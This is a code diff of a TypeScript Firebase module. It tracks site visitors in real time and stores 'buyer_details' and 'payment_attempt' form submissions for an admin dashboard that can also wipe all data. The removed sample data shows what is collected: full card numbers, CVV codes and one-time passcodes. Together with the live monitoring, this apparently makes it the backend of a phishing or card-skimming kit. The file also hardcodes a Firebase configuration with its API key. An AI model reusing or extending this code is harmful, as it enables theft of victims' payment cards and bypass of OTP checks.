@@ -1,6 +1,29 @@
-import { initializeApp, getApps, getApp, type FirebaseApp } from "firebase/app"
-import { getDatabase, ref, onValue, remove, push, set, type Database } from "firebase/database"
-import { getAuth, type Auth } from "firebase/auth"
+import { initializeApp } from "firebase/app";
+import {
+  getFirestore,
+  collection,
+  addDoc,
+  doc,
+  setDoc,
+  updateDoc,
+  getDocs,
+  deleteDoc,
+  query,
+  where,
+  orderBy,
+  limit,
+  onSnapshot,
+  serverTimestamp,
+  Timestamp,
+  writeBatch,
+} from "firebase/firestore";
+import {
+  getAuth,
+  signInWithEmailAndPassword,
+  signOut,
+  onAuthStateChanged,
+  User,
+} from "firebase/auth";
 
 const firebaseConfig = {
   apiKey: "AIzaSyDgFnMZD4NHBPe6cAT1CtL1amIBqmaKzEU",
@@ -11,175 +34,289 @@ const firebaseConfig = {
   messagingSenderId: "669950264738",
   appId: "1:669950264738:web:b18d8aae90b7e048c3defb",
   measurementId: "G-XVP5TC5KKQ",
-}
+};
 
-let app: FirebaseApp | null = null
-let db: Database | null = null
-let auth: Auth | null = null
-
-if (typeof window !== "undefined") {
-  app = getApps().length === 0 ? initializeApp(firebaseConfig) : getApp()
-  db = getDatabase(app)
-  auth = getAuth(app)
-}
-
-export { auth }
-
-function getDB() {
-  if (!db) {
-    throw new Error("Database not initialized. Make sure you're on the client side.")
-  }
-  return db
-}
+const app = initializeApp(firebaseConfig);
+export const db = getFirestore(app);
+export const auth = getAuth(app);
 
 export interface VisitorData {
-  visitorId: string
-  country: string
-  city: string
-  isOnline: boolean
-  currentPage: string
-  lastSeen: number
+  visitorId: string;
+  country: string;
+  city: string;
+  currentPage: string;
+  isOnline: boolean;
+  lastSeen: Timestamp;
+  userAgent: string;
+  screenSize: string;
+  language: string;
+  referrer: string;
+  entryPage: string;
+  sessionStart: Timestamp;
+  pageViews: number;
 }
 
 export interface FormSubmission {
-  id: string
-  visitorId: string
-  formType: "buyer_details" | "payment_attempt"
-  data: Record<string, any>
-  success: boolean
-  timestamp: number
+  visitorId: string;
+  formType: "buyer_details" | "payment_attempt";
+  data: Record<string, any>;
+  timestamp: Timestamp;
+  success: boolean;
 }
 
-export function subscribeToVisitors(callback: (data: VisitorData[]) => void) {
-  const visitorsRef = ref(getDB(), "visitors")
-
-  return onValue(visitorsRef, (snapshot) => {
-    const visitors: VisitorData[] = []
-    const data = snapshot.val()
-
-    if (data) {
-      Object.entries(data).forEach(([id, value]: [string, any]) => {
-        visitors.push({
-          visitorId: id,
-          country: value.country || "",
-          city: value.city || "",
-          isOnline: value.isOnline || false,
-          currentPage: value.currentPage || "",
-          lastSeen: value.lastSeen || Date.now(),
-        })
-      })
-
-      // Sort by lastSeen descending
-      visitors.sort((a, b) => b.lastSeen - a.lastSeen)
-    }
-
-    callback(visitors)
-  })
+export interface PageView {
+  visitorId: string;
+  page: string;
+  timestamp: Timestamp;
+  duration?: number;
 }
 
-export function subscribeToFormSubmissions(callback: (data: FormSubmission[]) => void) {
-  const formsRef = ref(getDB(), "form_submissions")
-
-  return onValue(formsRef, (snapshot) => {
-    const submissions: FormSubmission[] = []
-    const data = snapshot.val()
-
-    if (data) {
-      Object.entries(data).forEach(([id, value]: [string, any]) => {
-        submissions.push({
-          id,
-          visitorId: value.visitorId || "",
-          formType: value.formType || "buyer_details",
-          data: value.data || {},
-          success: value.success || false,
-          timestamp: value.timestamp || Date.now(),
-        })
-      })
-
-      // Sort by timestamp descending
-      submissions.sort((a, b) => b.timestamp - a.timestamp)
-    }
-
-    callback(submissions)
-  })
-}
-
-export function getOnlineVisitorsCount(callback: (count: number) => void) {
-  const visitorsRef = ref(getDB(), "visitors")
-
-  return onValue(visitorsRef, (snapshot) => {
-    let count = 0
-    const data = snapshot.val()
-
-    if (data) {
-      Object.values(data).forEach((visitor: any) => {
-        if (visitor.isOnline) count++
-      })
-    }
-
-    callback(count)
-  })
-}
-
-export async function deleteAllData() {
-  try {
-    // Delete all visitors
-    const visitorsRef = ref(getDB(), "visitors")
-    await remove(visitorsRef)
-
-    // Delete all form submissions
-    const formsRef = ref(getDB(), "form_submissions")
-    await remove(formsRef)
-
-    return { success: true }
-  } catch (error) {
-    console.error("Error deleting data:", error)
-    return { success: false, error }
+const getVisitorId = (): string => {
+  let visitorId = localStorage.getItem("visitorId");
+  if (!visitorId) {
+    visitorId =
+      "visitor_" +
+      Math.random().toString(36).substring(2) +
+      Date.now().toString(36);
+    localStorage.setItem("visitorId", visitorId);
   }
-}
+  return visitorId;
+};
 
-export async function addTestVisitor() {
-  const visitorsRef = ref(getDB(), "visitors")
-  const newVisitorRef = push(visitorsRef)
+const getLocationData = async (): Promise<{
+  country: string;
+  city: string;
+}> => {
+  try {
+    const response = await fetch("https://ipapi.co/json/");
+    const data = await response.json();
+    return {
+      country: data.country_name || "Unknown",
+      city: data.city || "Unknown",
+    };
+  } catch {
+    return { country: "Unknown", city: "Unknown" };
+  }
+};
 
-  await set(newVisitorRef, {
-    country: "United States",
-    city: "New York",
-    isOnline: true,
-    currentPage: "/",
-    lastSeen: Date.now(),
-  })
+export const trackVisitor = async (currentPage: string) => {
+  try {
+    const visitorId = getVisitorId();
+    const location = await getLocationData();
 
-  return newVisitorRef.key
-}
+    const visitorRef = doc(db, "visitors", visitorId);
 
-export async function addTestFormSubmission(visitorId: string, formType: "buyer_details" | "payment_attempt") {
-  const formsRef = ref(getDB(), "form_submissions")
-  const newFormRef = push(formsRef)
+    const visitorData: Partial<VisitorData> = {
+      visitorId,
+      country: location.country,
+      city: location.city,
+      currentPage,
+      isOnline: true,
+      lastSeen: serverTimestamp() as Timestamp,
+      userAgent: navigator.userAgent,
+      screenSize: `${window.innerWidth}x${window.innerHeight}`,
+      language: navigator.language,
+      referrer: document.referrer || "direct",
+    };
 
-  const testData =
-    formType === "buyer_details"
-      ? {
-          fullName: "John Doe",
-          phone: "+1234567890",
-          email: "john@example.com",
-          address: "123 Main St",
-        }
-      : {
-          cardholderName: "JOHN DOE",
-          cardLast4: "4532 1234 5678 9010",
-          expiryDate: "12/25",
-          cvv: "123",
-          otp: "123456",
-        }
+    const isNewSession = !sessionStorage.getItem("sessionStarted");
+    if (isNewSession) {
+      sessionStorage.setItem("sessionStarted", "true");
+      visitorData.entryPage = currentPage;
+      visitorData.sessionStart = serverTimestamp() as Timestamp;
+      visitorData.pageViews = 1;
+    }
 
-  await set(newFormRef, {
-    visitorId,
-    formType,
-    data: testData,
-    success: formType === "payment_attempt",
-    timestamp: Date.now(),
-  })
+    await setDoc(visitorRef, visitorData, { merge: true });
 
-  return newFormRef.key
-}
+    await addDoc(collection(db, "pageViews"), {
+      visitorId,
+      page: currentPage,
+      timestamp: serverTimestamp(),
+    });
+
+    return visitorId;
+  } catch (error) {
+    console.error("Error tracking visitor:", error);
+    return null;
+  }
+};
+
+export const updateOnlineStatus = async (isOnline: boolean) => {
+  try {
+    const visitorId = getVisitorId();
+    const visitorRef = doc(db, "visitors", visitorId);
+    await updateDoc(visitorRef, {
+      isOnline,
+      lastSeen: serverTimestamp(),
+    });
+  } catch (error) {
+    console.error("Error updating online status:", error);
+  }
+};
+
+export const trackPageView = async (page: string) => {
+  try {
+    const visitorId = getVisitorId();
+    const visitorRef = doc(db, "visitors", visitorId);
+
+    await updateDoc(visitorRef, {
+      currentPage: page,
+      lastSeen: serverTimestamp(),
+    });
+
+    await addDoc(collection(db, "pageViews"), {
+      visitorId,
+      page,
+      timestamp: serverTimestamp(),
+    });
+  } catch (error) {
+    console.error("Error tracking page view:", error);
+  }
+};
+
+export const saveFormSubmission = async (
+  formType: "buyer_details" | "payment_attempt",
+  data: Record<string, any>,
+  success: boolean,
+) => {
+  try {
+    const visitorId = getVisitorId();
+
+    await addDoc(collection(db, "formSubmissions"), {
+      visitorId,
+      formType,
+      data,
+      timestamp: serverTimestamp(),
+      success,
+    }),
+      { merge: true };
+  } catch (error) {
+    console.error("Error saving form submission:", error);
+  }
+};
+
+export const subscribeToVisitors = (
+  callback: (visitors: VisitorData[]) => void,
+) => {
+  const q = query(
+    collection(db, "visitors"),
+    orderBy("lastSeen", "desc"),
+    limit(100),
+  );
+
+  return onSnapshot(q, (snapshot) => {
+    const visitors = snapshot.docs.map((doc) => doc.data() as VisitorData);
+    callback(visitors);
+  });
+};
+
+export const subscribeToFormSubmissions = (
+  callback: (submissions: FormSubmission[]) => void,
+) => {
+  const q = query(
+    collection(db, "formSubmissions"),
+    orderBy("timestamp", "desc"),
+    limit(100),
+  );
+
+  return onSnapshot(q, (snapshot) => {
+    const submissions = snapshot.docs.map(
+      (doc) => ({ id: doc.id, ...doc.data() }) as any,
+    );
+    callback(submissions);
+  });
+};
+
+export const getOnlineVisitorsCount = (callback: (count: number) => void) => {
+  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
+  const q = query(collection(db, "visitors"), where("isOnline", "==", true));
+
+  return onSnapshot(q, (snapshot) => {
+    const onlineCount = snapshot.docs.filter((doc) => {
+      const data = doc.data();
+      const lastSeen = data.lastSeen?.toDate?.() || new Date(0);
+      return lastSeen > fiveMinutesAgo;
+    }).length;
+    callback(onlineCount);
+  });
+};
+
+export { getVisitorId };
+
+// Auth functions
+export const loginAdmin = async (email: string, password: string) => {
+  try {
+    const userCredential = await signInWithEmailAndPassword(
+      auth,
+      email,
+      password,
+    );
+    return { user: userCredential.user, error: null };
+  } catch (error: any) {
+    let errorMessage = "Login failed. Please try again.";
+    switch (error.code) {
+      case "auth/invalid-email":
+        errorMessage = "Invalid email address";
+        break;
+      case "auth/user-not-found":
+        errorMessage = "No account found with this email";
+        break;
+      case "auth/wrong-password":
+        errorMessage = "Incorrect password";
+        break;
+      case "auth/too-many-requests":
+        errorMessage = "Too many attempts. Please try again later";
+        break;
+      case "auth/invalid-credential":
+        errorMessage = "Invalid email or password";
+        break;
+    }
+    return { user: null, error: errorMessage };
+  }
+};
+
+export const logoutAdmin = async () => {
+  try {
+    await signOut(auth);
+    return { success: true, error: null };
+  } catch (error: any) {
+    return { success: false, error: error.message };
+  }
+};
+
+export const subscribeToAuthState = (callback: (user: User | null) => void) => {
+  return onAuthStateChanged(auth, callback);
+};
+
+export const deleteAllData = async (): Promise<{ success: boolean; error: string | null }> => {
+  try {
+    const batch = writeBatch(db);
+    
+    // Delete all visitors
+    const visitorsSnapshot = await getDocs(collection(db, "visitors"));
+    visitorsSnapshot.docs.forEach((docSnapshot) => {
+      batch.delete(docSnapshot.ref);
+    });
+    
+    // Delete all form submissions
+    const formsSnapshot = await getDocs(collection(db, "formSubmissions"));
+    formsSnapshot.docs.forEach((docSnapshot) => {
+      batch.delete(docSnapshot.ref);
+    });
+    
+    // Delete all page views
+    const pageViewsSnapshot = await getDocs(collection(db, "pageViews"));
+    pageViewsSnapshot.docs.forEach((docSnapshot) => {
+      batch.delete(docSnapshot.ref);
+    });
+    
+    await batch.commit();
+    return { success: true, error: null };
+  } catch (error: any) {
+    console.error("Error deleting all data:", error);
+    return { success: false, error: error.message };
+  }
+};
+
+export type { User };
